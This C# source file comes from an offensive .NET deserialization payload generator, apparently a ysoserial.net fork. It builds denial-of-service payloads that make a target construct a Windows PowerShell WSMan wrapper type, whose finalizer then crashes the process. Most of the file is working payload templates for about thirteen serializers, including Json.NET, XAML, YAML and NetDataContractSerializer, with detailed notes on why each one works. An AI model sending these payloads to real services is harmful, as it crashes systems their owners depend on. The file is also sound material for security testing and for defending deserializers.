using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * WSManPluginInstance: makes the target BUILD one object and then lets the garbage
     * collector kill the process. There is no command, no path and no URL - the payload is
     * a type name and nothing else.
     *
     * The target is Windows PowerShell's WSMan plugin entry wrapper:
     *
     *   System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper
     *
     * and this is the whole of it, decompiled from the shipping 3.0.0.0 GAC assembly:
     *
     *   public sealed class WSManPluginManagedEntryInstanceWrapper : IDisposable
     *   {
     *       private bool disposed;
     *       private GCHandle initDelegateHandle;
     *
     *       private void Dispose(bool disposing)
     *       {
     *           if (!disposed)
     *           {
     *               initDelegateHandle.Free();     // <-- the sink
     *               disposed = true;
     *           }
     *       }
     *
     *       ~WSManPluginManagedEntryInstanceWrapper() { Dispose(disposing: false); }
     *
     *       public IntPtr GetEntryDelegate()
     *       {
     *           InitPluginDelegate initPluginDelegate = WSManPluginManagedEntryWrapper.InitPlugin;
     *           initDelegateHandle = GCHandle.Alloc(initPluginDelegate);   // the ONLY allocation
     *           return Marshal.GetFunctionPointerForDelegate((Delegate)initPluginDelegate);
     *       }
     *   }
     *
     * GetEntryDelegate is the only thing that ever allocates initDelegateHandle, and WSMan
     * calls it when it really is hosting a plugin. An instance a DESERIALIZER built has never
     * been through that path, so its handle is still the default, zero one. When the object
     * becomes unreachable:
     *
     *   finalizer -> Dispose(false) -> GCHandle.Free() on a default handle
     *             -> InvalidOperationException("Handle is not initialized.")
     *             -> unhandled on the finalizer thread -> the CLR terminates the process
     *
     * Nothing in Dispose(bool) catches it, and an exception that escapes a finalizer has
     * terminated the process since .NET 2.0. So merely CONSTRUCTING this type is the payload.
     *
     * THE EFFECT IS ASYNCHRONOUS. It happens on the next collection that finds the object
     * unreachable, and then on the finalizer thread, so nothing about it is immediate or
     * scheduled. A target under load may die within moments; an idle one may take a while.
     * The gadget must not be described as if it terminated the process on deserialize.
     *
     * WHAT THE TARGET NEEDS. Not a runtime version - a specific ASSEMBLY. The type ships in
     * Windows PowerShell's System.Management.Automation, whose GAC identity has been
     * 3.0.0.0 since PowerShell 3.0 and still is on Windows PowerShell 5.1. That assembly is
     * present on most Windows installations but is not guaranteed: a stripped or PowerShell
     * free image will not have it, and PowerShell 7 ships a DIFFERENT assembly identity that
     * this gadget makes no claim about. Hence GadgetRequirement.ExtraAssembly and a runtime
     * version axis deliberately left unspecified - the gate is a library, not a build.
     *
     * WHY EVERY PAYLOAD IS HAND WRITTEN. Constructing the target inside ysonet would arm the
     * exact finalizer that kills a process, and ysonet is the process. No branch below ever
     * creates one; the two type-swap formats serialize the empty surrogate at the bottom of
     * this file and rewrite the type name in the finished bytes instead.
     *
     * -t IS ISOLATED, NOT REFUSED. The self-test runs in a CHILD ysonet process
     * (SelfTestNeedsChildProcess -> Helpers/Core/IsolatedSelfTest): the child gets the exact
     * bytes the operator gets, the child forces a collection, the child is the one that dies,
     * and ysonet reports what happened. See Generators/README.md, "-t (self-test) policy".
     */
    public class WSManPluginInstanceGenerator : GenericGenerator
    {
        // The target type, spelled out. It NEVER changes: this gadget is a denial-of-service
        // payload for one known finalizer, not a generic "instantiate any type" tool, and the
        // facet, the warning and the formatter audit only mean something while the type is
        // fixed. That is a decision about what the gadget IS, not input validation.
        public const string TargetClrName =
            "System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper";

        // The CLR namespace and the assembly's simple name, needed on their own by the XAML
        // document (clr-namespace:...;assembly=...).
        public const string TargetNamespace = "System.Management.Automation.Remoting";
        public const string TargetAssemblySimpleName = "System.Management.Automation";

        // Windows PowerShell's GAC identity. The 3.0.0.0 assembly version has been Windows
        // PowerShell's since PowerShell 3.0 and is still what Windows PowerShell 5.1 ships
        // (verified against 5.1 here), which is why one default covers a normal Windows build.
        public const string DefaultAssemblyName =
            "System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";

        // Canonical long name of the one option, so the generator, its help, the completion
        // script and the tests cannot drift apart.
        public const string AssemblyOptionName = "assembly";

        private string assemblyName = DefaultAssemblyName;

        // ---- Metadata ----------------------------------------------------------

        // Denial of service, and nothing else. The payload carries no operator data, reads
        // nothing, writes nothing and contacts nobody: it names a type, the target builds it,
        // and the target's own garbage collector does the rest.
        //
        // Declaring PayloadKind.DenialOfService is what arms Helpers/Core/DosPolicy: the
        // gadget refuses to build without --i-understand-dos, every bulk run leaves it out,
        // and no test tier deserializes it.
        //
        // Input is "none" by derivation from CommandInputType.Ignored, so it is not declared
        // here.
        //
        // THE RUNTIME VERSION AXIS IS DELIBERATELY UNSPECIFIED, and that is not a gap. The
        // gate is not a framework build at all: an unhandled finalizer exception has
        // terminated the process on every .NET Framework version this tool targets, and what
        // actually decides whether the payload lands is whether the target can resolve
        // Windows PowerShell's System.Management.Automation. That is a LIBRARY condition, so
        // per the RuntimeVersion contract in Generators/Base/IGenerator.cs it belongs in
        // AdditionalInfo() and in the option help, not in a guessed version range.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.DenialOfService)
                .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework);
        }

        // Oleksandr Mirosh and Alvaro Munoz published this type as a .NET deserialization
        // gadget in "SSO Wars: The Token Menace" (Black Hat USA 2019). Piotr Bazydlo later
        // used the same finalizer as a pre-auth denial of service through unsafe reflection
        // in CVE-2025-3600 (watchTowr Labs), which is the write-up that spells the crash out
        // most clearly; see docs/references.md.
        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a
        // long one pushes the formatter, command-input and category lines off the screen.
        // The detail lives in the option help and in docs/usage-and-examples.md, and the
        // authorization wording is already on the shared DoS banner (DosPolicy.WarningText),
        // so it is not repeated here.
        public override string AdditionalInfo()
        {
            return "Builds a Windows PowerShell type whose finalizer terminates the target "
                + "process. The effect is asynchronous and needs System.Management.Automation.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and names a framework type of its own.
            return new List<string> { GadgetTags.Independent };
        }

        // The widest formatter list in this catalogue, and the reason is the payload's shape
        // rather than anything clever: "construct this type and set nothing" is the one thing
        // almost every serializer can express. There is no member to place, no constructor
        // argument to smuggle and no property order to get right - only a type name - so the
        // usual dividing line (does this serializer drive an ISerializable constructor, or set
        // properties by name?) does not apply here at all.
        //
        // Every entry below was proven by generating the payload and watching a CHILD ysonet
        // process die with
        //   0xE0434352 Unhandled Exception: System.InvalidOperationException:
        //   Handle is not initialized.
        // which is the target's own finalizer, not merely "the document parsed".
        //
        // FOUR FORMATS ARE OUT, and each one is a measured or structural fact, not an
        // unexplored cell:
        //
        //  - BinaryFormatter, SoapFormatter, LosFormatter: IMPOSSIBLE. All three read through
        //    mscorlib's ObjectReader, which calls CheckSerializable BEFORE it creates
        //    anything - "if (!t.IsSerializable && !HasSurrogate(t)) throw new
        //    SerializationException(Serialization_NonSerType)". The target carries no
        //    [Serializable] attribute, so they refuse the TYPE and no document shape can get
        //    past it. Locked by WSManPluginInstanceCannotUseTheRuntimeFormatters.
        //  - FsPickler: IMPOSSIBLE, for its own separate reason, and only the INNERMOST
        //    exception says so - the outer one is the useless "Error deserializing object of
        //    type 'System.Object'". FsPickler refuses the type during pickler resolution:
        //    "NonSerializableTypeException: Type
        //    'System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper'
        //    is not serializable." Same class of refusal as on FileSystemInfo, a different
        //    cause (that one was MarshalByRefObject; this one is the missing attribute).
        //
        // DataContractJsonSerializer IS here, and it is the weakest entry, so read it for what
        // it is: that format writes no type name at all, so the payload is literally "{}" and
        // the CONSUMER's declared root type decides what gets built. It was still measured
        // end to end - the target is constructed and the finalizer does fire - but it only
        // lands where the consuming application already names this type itself. The two
        // envelope formats (DataContractSerializer, XmlSerializer) carry the same assumption,
        // stated openly by this project's <root type="..."> wrapper.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.Xaml,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                "YamlDotNet < 5.0.0",
                Formatters.SharpSerializerXml,
                Formatters.SharpSerializerBinary,
                Formatters.MessagePackTypeless,
                Formatters.MessagePackTypelessLz4,
                Formatters.DataContractSerializer,
                Formatters.DataContractJsonSerializer,
                Formatters.NetDataContractSerializer,
                Formatters.XmlSerializer,
            };
        }

        // There is nothing for the operator to supply. The payload is a type name.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.Ignored;
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    AssemblyOptionName + "=",
                    // The default is QUOTED so the interactive editor can read it whole and
                    // open the field already holding it (EditableField.ParseDefault). An
                    // unquoted one would be cut at the first comma, which for an assembly
                    // display name means a value that names nothing.
                    "The assembly display name written into the payload.\r\n"
                        + "Default: \"" + DefaultAssemblyName + "\"\r\n"
                        + "which is Windows PowerShell's GAC identity. The 3.0.0.0 assembly "
                        + "version has been Windows PowerShell's since PowerShell 3.0 and is "
                        + "still what Windows PowerShell 5.1 ships (verified there), so the "
                        + "default is what you want against a normal Windows target.\r\n"
                        + "\r\n"
                        + "The value is written EXACTLY as typed and only an empty one is "
                        + "refused. Whether a name binds is the target's decision, not this "
                        + "tool's, so a repackaged, renamed, side-by-side or differently "
                        + "versioned copy is yours to point at. The TYPE name never changes: "
                        + TargetClrName + ".\r\n"
                        + "\r\n"
                        + "PowerShell 7 ships System.Management.Automation under a different "
                        + "identity on a different runtime. Nothing here has been reproduced "
                        + "against it, so there is no preset for it and no claim about it.\r\n"
                        + "\r\n"
                        + "WHAT THE PAYLOAD DOES. The target builds the type; its finalizer "
                        + "frees a GCHandle that was never allocated, which throws on the "
                        + "finalizer thread, and an exception there terminates the process. The "
                        + "effect is ASYNCHRONOUS - it waits for a collection - so do not expect "
                        + "it at the moment of deserialization.",
                    v => { if (v != null) assemblyName = v; }
                },
            };
        }

        // -t never deserializes this payload in the ysonet process: it would terminate the
        // tool the moment the operator asked to see what the payload does. Every formatter
        // routes to a child ysonet process, which reads the payload, forces a collection and
        // dies in ysonet's place. Nothing is refused, because the child can read every format
        // this gadget advertises.
        public override bool SelfTestNeedsChildProcess(string formatter, InputArgs inputArgs)
        {
            return true;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // The only check on the operator's value: it has to be non-empty, because an empty
            // assembly name produces a payload that cannot name a type at all. Everything else
            // about it is the target's business (Generators/README.md, "Operator input:
            // document it, do not police it").
            if (string.IsNullOrWhiteSpace(assemblyName))
                throw new ArgumentException(Name() + " needs a non-empty --" + AssemblyOptionName
                    + " value. Leave it out to use the default: " + DefaultAssemblyName);

            if (inputArgs != null && inputArgs.Test)
                // Said BEFORE anything happens, because the operator is about to have a real
                // process killed on their machine on purpose. Warnings the operator must see in
                // a normal run travel on RunResult.Warnings; this one is tied to -t, so it goes
                // straight to stderr next to the self-test's own output.
                System.Console.Error.WriteLine("[self-test] " + Name()
                    + ": a child ysonet process is about to be terminated on purpose. "
                    + "This process is not affected.");

            return FinishHandWrittenPayload(BuildPayload(formatter), formatter, inputArgs,
                SelfTestRootType(formatter, inputArgs));
        }

        // ---- The payload -------------------------------------------------------

        // The assembly qualified name, and the space-free spelling the SharpSerializer XML
        // document and the YAML tag need. Both are just the fixed type name joined to whatever
        // assembly display name the operator chose.
        private string TargetTypeName()
        {
            return TargetClrName + ", " + assemblyName;
        }

        private string TargetTypeNameNoSpaces()
        {
            return TargetTypeName().Replace(", ", ",");
        }

        // Every document below says the same thing: "make one of these, set nothing". The type
        // has no public property or field at all, so there is no member list anywhere - which
        // is exactly why so many different serializers can express it.
        private object BuildPayload(string formatter)
        {
            string typeName = TargetTypeName();

            if (IsFormatter(formatter, Formatters.JsonNet))
            {
                return @"
{
    ""$type"":""" + typeName + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    ""__type"":""" + typeName + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        """ + typeName + @""":""1""
    },
    ""$type"":""1""
}";
            }

            if (IsFormatter(formatter, Formatters.YamlDotNet))
            {
                // A YAML tag naming the type, followed by an EMPTY mapping. The braces are not
                // decoration: a tag with nothing after it is a null scalar, and YamlDotNet then
                // builds nothing at all.
                return @"
!<!" + TargetTypeNameNoSpaces() + @"> {}";
            }

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                // XAML resolves the assembly from its simple name and instantiates the element
                // with the public parameterless constructor. The operator's --assembly value is
                // not used here: the xmlns form takes a namespace and an assembly NAME, not a
                // display name with a version and a public key token.
                return @"<WSManPluginManagedEntryInstanceWrapper xmlns=""clr-namespace:" + TargetNamespace
                    + ";assembly=" + TargetAssemblySimpleName + @""" />";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""" + TargetTypeNameNoSpaces() + @""">
    <Properties />
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
            {
                // No document to hand write for the binary mode, and building the real target
                // here would arm the finalizer inside ysonet. Serialize the empty surrogate and
                // rewrite the one type-name record in the finished stream.
                return SharpSerializerTypeSwap.SerializeAs(new WSManPluginInstanceSurrogate(), typeName);
            }

            if (IsMessagePackTypeless(formatter))
            {
                // Same bait and switch, in MessagePack's typeless type cache. The root is passed
                // as object, which is the one place MessagePack Typeless writes a type name.
                return MessagePackTypelessTypeSwap.SerializeAs(
                    new WSManPluginInstanceSurrogate(), typeName, IsMessagePackLz4(formatter));
            }

            if (IsFormatter(formatter, Formatters.NetDataContractSerializer))
            {
                // NetDataContractSerializer carries the CLR type on the root element itself.
                // The target is a plain public class with no data members, so the contract is
                // an empty element.
                return @"<WSManPluginManagedEntryInstanceWrapper "
                    + @"xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" "
                    + @"xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" "
                    + @"z:Type=""" + TargetClrName + @""" "
                    + @"z:Assembly=""" + assemblyName + @""" "
                    + @"xmlns=""http://schemas.datacontract.org/2004/07/" + TargetNamespace + @""" />";
            }

            if (IsFormatter(formatter, Formatters.DataContractSerializer))
            {
                // DataContractSerializer carries no type information, so this project's
                // <root type="..."> envelope states the root type a real consumer would have
                // fixed in its own code. The target is a plain public class, so its contract is
                // its CLR name in the data-contract namespace derived from its CLR namespace,
                // and its body is empty because it has no data members.
                return @"<root type=""" + typeName + @""">"
                    + @"<WSManPluginManagedEntryInstanceWrapper "
                    + @"xmlns=""http://schemas.datacontract.org/2004/07/" + TargetNamespace + @""" />"
                    + @"</root>";
            }

            if (IsFormatter(formatter, Formatters.DataContractJsonSerializer))
            {
                // The most extreme case of "the document names nothing": DataContractJsonSerializer
                // writes no type at all, so the payload is an empty object and the consumer's own
                // declared root type is what decides which type gets built. That still constructs
                // the target and still fires the finalizer - measured, not assumed - it just only
                // lands where the consumer already named this type.
                return "{}";
            }

            if (IsFormatter(formatter, Formatters.XmlSerializer))
            {
                // Same envelope, different body: XmlSerializer knows nothing about data
                // contracts. It maps a type to an element named after the bare CLR type name in
                // NO namespace, so the data-contract xmlns the DataContractSerializer document
                // carries is exactly what makes this one fail ("There is an error in XML
                // document (1, 2)").
                return @"<root type=""" + typeName + @""">"
                    + @"<WSManPluginManagedEntryInstanceWrapper />"
                    + @"</root>";
            }

            throw UnsupportedFormatter(formatter);
        }

        // DataContractJsonSerializer's document names no type, so a self-test has to be told
        // what to read it back as. Resolved ONLY when -t is used and only for that formatter,
        // so ordinary generation never loads the target assembly into ysonet - a target
        // dependency must not become a generator dependency.
        //
        // It is resolved here rather than in the child because FinishHandWrittenPayload needs
        // a Type to refuse the combination loudly when it is missing; the child then gets the
        // NAME and resolves it again on its own side. On a machine with no Windows PowerShell,
        // or with an --assembly value that names something this box does not have, -t on this
        // one formatter reports a type load failure and generation is unaffected.
        private Type SelfTestRootType(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return null;
            if (!IsFormatter(formatter, Formatters.DataContractJsonSerializer))
                return null;
            return Type.GetType(TargetTypeName(), true);
        }

        // Shape only, and deliberately empty: the target has no public property or field, so
        // the surrogate must have none either or the swapped payload would carry members the
        // real type cannot accept. Never deserialized as itself - SharpSerializerTypeSwap and
        // MessagePackTypelessTypeSwap rewrite the type name before the payload leaves ysonet.
        internal sealed class WSManPluginInstanceSurrogate
        {
        }
    }
}
